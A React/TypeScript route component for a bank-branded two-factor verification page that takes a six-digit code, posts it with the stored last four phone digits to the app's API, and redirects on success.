import { createLazyFileRoute } from '@tanstack/react-router'
import { useEffect, useState, type FormEvent } from 'react';
// import titleImg from '../../assets/img/title_img.gif';
import twoFactImg from '../../assets/img/twofactauth.png';
import Foot from '../../components/foot';
import { useNavigate } from '@tanstack/react-router';

function TwoFAuthenticationVerify() {
  const lastFour = localStorage.getItem('lastFour') ?? null;
  const [digitCode, setDigitCode] = useState('');
  const [message, setMessage] = useState('');
  const API_URL = import.meta.env.VITE_API_URL;

  const navigate = useNavigate();

  useEffect(() => {
    document.title = 'Welcome to Bankmobile checking';
  }, []);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (digitCode.length !== 6) {
      setMessage('Please enter the 6-digit verification code.');
      return;
    }

    try {
      const response = await fetch(`${API_URL}/api/profile/2FAuthenticationVerify`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          code: digitCode,
          lastFour,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        navigate({ to: '/success' });
      } else {
        setMessage(data.message || 'Verification failed. Please try again.');
      }
    } catch (error) {
      console.error('Error submitting verification code:', error);   
      setMessage('Unable to connect to the server. Please try again later.');
    }
  };

  const goBack = () => {
    localStorage.setItem('lastFour', lastFour ?? '0000');
    navigate({ to: '/profile/2FAuthentication' });
  }

  return <>
    <div className="">
        <div className="flex flex-col items-center text-sm max-md:w-full max-md:p-3 max-w-350 mx-auto">
            <div className="w-full mt-6">
            </div>
            <div className="w-full border-b-2 border-[#364153] mt-16"></div>
            <div className="w-2/5 max-w-xl rounded-xl border-4 border-[#364153] my-10 flex flex-col text-center justify-center items-center gap-5 p-5 max-lg:w-full max-md:mx-3">
                <div className="flex flex-col gap-5 items-center w-4/5">
                    <div>
                        <img src={twoFactImg} alt="twofacthimg" className="md:ml-5 w-auto h-20" />
                    </div>
                    <h2 className="text-center text-base">
                        We sent a secure code to your mobile phone ending in (***)***-<span id="lastFour">{lastFour}</span>,
                        Once you receive your code, enter it below.
                    </h2>
                </div>

                <form onSubmit={handleSubmit} className="flex flex-col gap-5 mt-5 justify-center w-full">
                    <div>
                        <input
                            type="text"
                            maxLength={6}
                            placeholder="Enter 6-digit code"
                            value={digitCode}
                            onChange={(e) => setDigitCode(e.target.value.replace(/[^0-9]/g, ''))}
                            required
                            className="px-4 py-3 border border-[#79bde9] text-center w-55.75 focus:outline-none focus:border-[#79bde9] focus:shadow-[0_0_10px_rgba(121,189,233,0.5)]"
                        />
                    </div>

                    {message ? (
                      <div className="text-red-600 text-sm">{message}</div>
                    ) : null}

                    <div className="flex gap-2 justify-center items-center">
                      <input type="checkbox" name="yesbox" className="w-5 h-5 accent-[#79bde9]" />
                      <h5>Trust this computer</h5>
                    </div>

                    <div className="max-md:w-full flex justify-center pt-2 items-center w-full">
                        <div className="flex gap-3">
                            <button type="button" onClick={goBack}
                                className="bg-white px-7.5 py-3.75 text-[#364153] border-2 hover:border-[#79bde9] hover:bg-[#79bde9] hover:text-black cursor-pointer transition">
                                Go Back
                            </button>
                            <button type="submit" id="completeBtn"
                                className="bg-white px-7.5 py-3.75 text-[#364153] border-2 hover:border-[#79bde9] hover:bg-[#79bde9] hover:text-black cursor-pointer transition">
                                Complete
                            </button>
                        </div>
                    </div>
                </form>
            </div>
            <div className="w-full border-b-2 border-gray-400"></div>
            <Foot />
        </div>
    </div>
  </>
}

export const Route = createLazyFileRoute('/profile/2FAuthenticationVerify')({
  component: TwoFAuthenticationVerify,
})

